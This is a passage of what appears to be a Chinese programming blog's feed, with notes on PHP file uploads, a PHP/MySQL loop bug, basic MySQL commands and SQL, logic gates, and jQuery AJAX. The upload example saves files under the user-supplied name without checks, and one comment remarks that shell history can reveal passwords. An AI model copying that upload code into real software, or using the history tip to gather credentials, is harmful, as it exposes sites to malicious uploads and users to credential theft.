class="comment">//结果:</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [file] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; dog1111.jpg</span><br><span class="line">            [type] =&gt; image/jpeg</span><br><span class="line">            [tmp_name] =&gt; /tmp/php0APUAO     <span class="comment">//默认上传到了/tmp文件夹,如果不立即移走,程序运行结束后就会被删除</span></span><br><span class="line">            [<span class="built_in">error</span>] =&gt; <span class="number">0</span></span><br><span class="line">            [size] =&gt; <span class="number">27295</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li><strong>判断文件或目录是否存在</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_exists(目录或文件名);</span><br><span class="line">file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])     </span><br></pre></td></tr></table></figure><ul><li><strong>移动文件到upload/</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(源路径,目标路径);</span><br><span class="line">move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>while mysql_fetch_array 死循环原因</title>
      <link href="/posts/19927/"/>
      <url>/posts/19927/</url>
      
        <content type="html"><![CDATA[<ul><li><p><strong>错误代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from message&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>,MYSQL_ASSOC)[<span class="string">&quot;title&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>)  <span class="comment">//死循环!</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;title:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;date:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;date&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;txet:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;txt&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>正确代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from message&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>,MYSQL_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;title:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;date:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;date&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;txet:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;txt&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为条件不一样，后者每次循环先执行函数，然后将值赋予变量，然后指针后移，每次取的数据都是下一条，到最后一条数据执行完，返回的是假，所以执行完最后一条就退出循环,相当于是foreach循环,跑完了就跳出循环。而第一个，的条件是一个变量，这个变量是固定的值.</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql语句基础</title>
      <link href="/posts/49263/"/>
      <url>/posts/49263/</url>
      
        <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mariadb  <span class="comment">#启动MariaDB</span></span><br><span class="line">systemctl stop mariadb  <span class="comment">#停止MariaDB</span></span><br><span class="line">systemctl restart mariadb  <span class="comment">#重启MariaDB</span></span><br><span class="line">systemctl <span class="built_in">enable</span> mariadb  <span class="comment">#设置开机启动</span></span><br><span class="line">mysql_cecure_installation //初始化</span><br><span class="line">mysql -h host_name -uroot -proot  <span class="comment">#-h可为ip或者主机名  扩展：history 可收集密码</span></span><br><span class="line">show databases;     <span class="comment">#显示所有数据库</span></span><br><span class="line">use dbname;    <span class="comment">#选定默认数据库</span></span><br><span class="line">show tables;     <span class="comment">#显示默认数据的所有表</span></span><br><span class="line">desc 表名；       <span class="comment">#显示表结构属性</span></span><br><span class="line">show columns from user <span class="comment">#显示表结构属性</span></span><br><span class="line">create database 数据库名;  <span class="comment">#创建数据库</span></span><br><span class="line">drop database 数据库名;  <span class="comment">#删除数据库</span></span><br><span class="line">drop table <span class="built_in">test</span>； <span class="comment">#删除表</span></span><br><span class="line">use 数据库名;  <span class="comment">#选择数据库</span></span><br><span class="line">/etc/my.cnf  //数据库配置文件</span><br><span class="line">\c     <span class="comment">#放弃正在输入的命令</span></span><br><span class="line">\h     <span class="comment">#显示命令清单</span></span><br><span class="line">\q     <span class="comment">#退出mysql程序</span></span><br><span class="line">\s     <span class="comment">#查看mysql服务器状态信息</span></span><br></pre></td></tr></table></figure><h2 id="常用数据类型"><a href="#常用数据类型" class="headerlink" title="常用数据类型"></a>常用数据类型</h2><table><thead><tr><th>名称</th><th>类型</th><th>范围</th><th>用途</th></tr></thead><tbody><tr><td>int</td><td>整数型</td><td>(0，4 294 967 295)</td><td>大整数</td></tr><tr><td>float</td><td>浮点型</td><td>很小</td><td>浮点小数</td></tr><tr><td>datetime</td><td>时间型</td><td>YYYY-MM-DD/ HH:MM:SS</td><td>日期/时间</td></tr><tr><td>text</td><td>文本型</td><td>0-65535 bytes</td><td>长文本数据只能默认值为空</td></tr><tr><td>varchar</td><td>字符串</td><td>0-65535 bytes</td><td>变长字符串可有默认值</td></tr></tbody></table><h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><ul><li><strong>创建语句</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名 (列名<span class="number">1</span> 类型<span class="number">1</span> <span class="keyword">not</span> <span class="keyword">null</span> auto_increment <span class="keyword">primary</span> key，列名<span class="number">2</span> 类型<span class="number">2</span>)；</span><br></pre></td></tr></table></figure></li><li><strong>表结构操作</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">修改表名：</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info rename <span class="keyword">as</span> info2；</span><br><span class="line">修改字段：</span><br><span class="line">添加一个字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">add</span> username <span class="type">varchar</span>(<span class="number">255</span>);</span><br><span class="line">删除一个字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">drop</span> username；</span><br><span class="line">更改字段类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info modify col_name data_type</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info modify sex <span class="type">varchar</span>(<span class="number">3</span>);</span><br><span class="line">更改字段名字</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info change col_name1 col_name2 data_type</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info change sex sexy <span class="type">char</span>(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>插入语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name ( 字段<span class="number">1</span>, 字段<span class="number">2</span>,...字段N )</span><br><span class="line">                       <span class="keyword">VALUES</span></span><br><span class="line">                       ( value1, value2,...valueN ),(<span class="keyword">value</span>，<span class="keyword">value</span>);</span><br></pre></td></tr></table></figure><p>ps:如果数据是字符型，必须使用单引号或者双引号，如：”value”.</p><ul><li><p><strong>查询数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>(上级库).admin（表） <span class="operator">/</span><span class="operator">/</span>跨库查询</span><br><span class="line"><span class="keyword">select</span>  字段<span class="number">1</span>，字段<span class="number">2</span>，字段<span class="number">3</span>，字段N <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure></li><li><p><strong>where语句</strong></p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl <span class="keyword">WHERE</span> runoob_author<span class="operator">=</span><span class="string">&#x27;菜鸟教程 ;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2,...fieldN <span class="keyword">FROM</span> table_name1, table_name2...</span><br><span class="line">[<span class="keyword">WHERE</span> condition1 [<span class="keyword">AND</span> [<span class="keyword">OR</span>]] condition2.....  #field1先选定 要输出显示的列 <span class="operator">+</span> 表名 <span class="operator">+</span> <span class="keyword">where</span> 条件 <span class="operator">+</span> <span class="keyword">and</span> <span class="keyword">or</span> 条件.  <span class="keyword">DELETE</span> UPDATE可用</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        <span class="keyword">FROM</span> runoob_tbl</span><br><span class="line">        <span class="keyword">WHERE</span> runoob_author<span class="operator">=</span>&quot;RUNOOB.COM&quot;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><strong>update语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名 <span class="keyword">SET</span>  字段<span class="number">1</span><span class="operator">=</span><span class="keyword">new</span><span class="operator">-</span><span class="keyword">value</span>, 字段<span class="number">2</span><span class="operator">=</span><span class="keyword">new</span><span class="operator">-</span>value2</span><br><span class="line"><span class="keyword">WHERE</span> 一个条件或多个条件。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE runoob_tbl <span class="keyword">SET</span> runoob_title<span class="operator">=</span><span class="string">&#x27;学习 C++&#x27;</span> <span class="keyword">WHERE</span> runoob_id<span class="operator">=</span><span class="number">3</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>delete语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 一个或多个条件  </span><br></pre></td></tr></table></figure><ul><li><strong>LIKE 子句</strong></li></ul><p>不能单独使用,需要配合where使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 一个或多个条件在 <span class="keyword">LIKE</span> <span class="string">&#x27;%COM&#x27;</span>   </span><br><span class="line">update <span class="keyword">FROM</span> 表 <span class="keyword">SET</span> 一个字段<span class="operator">=</span><span class="keyword">value</span>, <span class="keyword">WHERE</span> 一个或多个条件在 <span class="keyword">LIKE</span> <span class="string">&#x27;%COM&#x27;</span>  </span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 一个或多个条件在 <span class="keyword">LIKE</span> <span class="string">&#x27;%COM&#x27;</span> </span><br></pre></td></tr></table></figure><ul><li> <strong>union语句</strong></li></ul><p>UNION 语句：用于将不同表中相同列中查询的数据展示出来；（不包括重复数据）</p><p>UNION ALL 语句：用于将不同表中相同列中查询的数据展示出来；（包括重复数据）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名称；</span><br><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名称；</span><br></pre></td></tr></table></figure><ul><li><strong>排序</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl <span class="keyword">ORDER</span> <span class="keyword">BY</span> submission_date <span class="keyword">ASC</span>;    <span class="operator">/</span>升序</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl <span class="keyword">ORDER</span> <span class="keyword">BY</span> submission_date <span class="keyword">DESC</span>;   <span class="operator">/</span>降序</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与、或、非、与非、或非、异或、同或</title>
      <link href="/posts/49591/"/>
      <url>/posts/49591/</url>
      
        <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">与：and &amp;&amp; -&gt;逻辑乘法 有<span class="number">0</span>出<span class="number">0</span>；全<span class="number">1</span>出<span class="number">1</span> 例：<span class="number">00</span>=<span class="number">0</span>,<span class="number">01</span>=<span class="number">0</span>,<span class="number">10</span>=<span class="number">0</span>,<span class="number">11</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">或：or  || -&gt;逻辑加法 有<span class="number">1</span>出<span class="number">1</span>，全<span class="number">0</span>出<span class="number">0</span> 例：<span class="number">00</span>=<span class="number">0</span>,<span class="number">01</span>=<span class="number">1</span>,<span class="number">10</span>=<span class="number">1</span>,<span class="number">11</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">非：not !  -&gt;逻辑否定 有<span class="number">1</span>出<span class="number">0</span>，有<span class="number">0</span>出<span class="number">1</span> 取相反值</span><br><span class="line"></span><br><span class="line">与非：nand-&gt;先按与的操作，然后结果取反 例:<span class="number">00</span>=<span class="number">1</span>,<span class="number">01</span>=<span class="number">1</span>,<span class="number">10</span>=<span class="number">1</span>,<span class="number">11</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">或非：nor-&gt;先按或的操作，然后结果取反 例:<span class="number">00</span>=<span class="number">1</span>,<span class="number">01</span>=<span class="number">0</span>,<span class="number">10</span>=<span class="number">0</span>,<span class="number">11</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">异或：xor-&gt;相同得<span class="number">0</span>;相异得<span class="number">1</span> 例:<span class="number">00</span>=<span class="number">0</span>,<span class="number">01</span>=<span class="number">1</span>,<span class="number">10</span>=<span class="number">1</span>,<span class="number">11</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">同或：xnor-&gt;相同得<span class="number">1</span>;相异得<span class="number">0</span> 例:<span class="number">00</span>=<span class="number">1</span>,<span class="number">01</span>=<span class="number">0</span>,<span class="number">10</span>=<span class="number">0</span> <span class="number">11</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>首先记住与、或、非。与非、或非只需要先按照与、或判断，再非一下。异或、与或关键词在于《异：不同》为1、《与：相同》为1。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jquery ajax及XMLHttpRequest常用方法</title>
      <link href="/posts/2353/"/>
      <url>/posts/2353/</url>
      
        <content type="html"><![CDATA[<h2 id="jquery基础操作"><a href="#jquery基础操作" class="headerlink" title="jquery基础操作"></a>jquery基础操作</h2><h3 id="三种选择器"><a href="#三种选择器" class="headerlink" title="三种选择器"></a>三种选择器</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>)      <span class="comment">//元素选择器 </span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>)<span class="comment">//id选择器</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;.test&quot;</span>)  <span class="comment">//class选择器</span></span><br></pre></td></tr></table></figure><h3 id="事件方法"><a href="#事件方法" class="headerlink" title="事件方法"></a>事件方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>).click();<span class="comment">//点击事件</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).dblclick();  <span class="comment">//双击事件</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).mouseenter(); <span class="comment">//鼠标移动事件</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).(<span class="built_in">document</span>).ready() <span class="comment">//页面加载完后执行事件</span></span><br></pre></td></tr></table></figure><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><h3 id="获得内容-text-、html-以及-val"><a href="#获得内容-text-、html-以及-val" class="headerlink" title="获得内容 - text()、html() 以及 val()"></a>获得内容 - text()、html() 以及 val()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#test&quot;</span>).text()  <span class="comment">//获得id元素text内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>).html()  <span class="comment">//获得id元素html内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>).val()   <span class="comment">////获得id元素value内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>).attr(<span class="string">&quot;href&quot;</span>) <span class="comment">//获得id元素href属性值</span></span><br></pre></td></tr></table></figure><h3 id="设置内容-text-、html-以及-val"><a href="#设置内容-text-、html-以及-val" class="headerlink" title="设置内容 - text()、html() 以及 val()"></a>设置内容 - text()、html() 以及 val()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#test1&quot;</span>).text(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#test2&quot;</span>).html(<span class="string">&quot;&lt;b&gt;Hello world!&lt;/b&gt;&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#test3&quot;</span>).val(<span class="string">&quot;value666&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#test4&quot;</span>).attr(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;http://baidu.com&quot;</span>);<span class="comment">//可设置多个值，逗号分开 </span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#test1&quot;</span>).text(<span class="function"><span class="keyword">function</span>(<span class="params">i,origText</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;旧 html: &quot;</span> + origText + <span class="string">&quot; 新 html&quot;</span>;</span><br><span class="line">&#125;);      <span class="comment">//回调函数传参旧值+新值</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test4&quot;</span>).attr(<span class="string">&quot;href&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">i,origValue</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> origValue + <span class="string">&quot;/jquery&quot;</span>; </span><br><span class="line">  &#125;);     <span class="comment">//回调函数传参旧值+新值</span></span><br></pre></td></tr></table></figure><h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>).append(<span class="string">&quot;追加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).prepend(<span class="string">&quot;在开头追加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;body&quot;</span>).append(txt1,txt2,txt3); <span class="comment">//定义变量，批量添加</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).after(<span class="string">&quot;在后面添加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).before(<span class="string">&quot;在前面添加文本&quot;</span>); </span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).after(txt1,txt2,txt3);  <span class="comment">//定义变量，批量添加</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#div1&quot;</span>).remove();   <span class="comment">//删除div1整个元素</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).empty();    <span class="comment">//删除div1下属的子元素</span></span><br></pre></td></tr></table></figure><h2 id="jQuery-AJAX-常用方法"><a href="#jQuery-AJAX-常用方法" class="headerlink" title="jQuery AJAX 常用方法"></a>jQuery AJAX 常用方法</h2><h3 id="ajax"><a href="#ajax" class="headerlink" title="$.ajax()"></a>$.ajax()</h3><p>JQuery原生的ajax编写格式，具有多个参数来设置相关的操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line"><span class="attr">url</span>:<span class="string">&quot;&quot;</span>,<span class="comment">//异步请求访问链接</span></span><br><span class="line"><span class="attr">data</span>:<span class="string">&quot;&quot;</span>,<span class="comment">//提交的数据，将自动转换为请求字符串格式</span></span><br><span class="line"><span class="attr">dataType</span>:<span class="string">&quot;&quot;</span>,<span class="comment">//json,xml,text,html等</span></span><br><span class="line"><span class="attr">type</span>:<span class="string">&quot;post&quot;</span>,<span class="comment">//默认值: &quot;GET&quot;。请求方式 (&quot;POST&quot; 或 &quot;GET&quot;)</span></span><br><span class="line"><span class="attr">async</span>:<span class="literal">true</span>,<span class="comment">//默认为true，即默认为异步请求，否则为同步请求</span></span><br><span class="line"><span class="attr">contentType</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,<span class="comment">//默认值为application/x-www-form-urlencoded，即表单提交的方式，可以切换为&quot;application/json&quot;</span></span><br><span class="line"><span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="comment">//当异步请求完成时所执行的回调函数</span></span><br><span class="line">&#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="get-和-post-方法"><a href="#get-和-post-方法" class="headerlink" title="get() 和 post() 方法"></a>get() 和 post() 方法</h3><p>$.get(<em>URL</em>,<em>callback</em>);</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">&quot;http://www.b.com/test.php?url=11&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data,status</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">&quot;数据:&quot;</span> + data + <span class="string">&quot;状态:&quot;</span> + status);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>$.post(URL,data,callback);</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.post(<span class="string">&quot;http://www.b.com/post.php&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&quot;dome&quot;</span>,</span><br><span class="line">        <span class="attr">key</span>:<span class="string">&quot;ccc&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">data,status</span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">&quot;数据:&quot;</span> + data 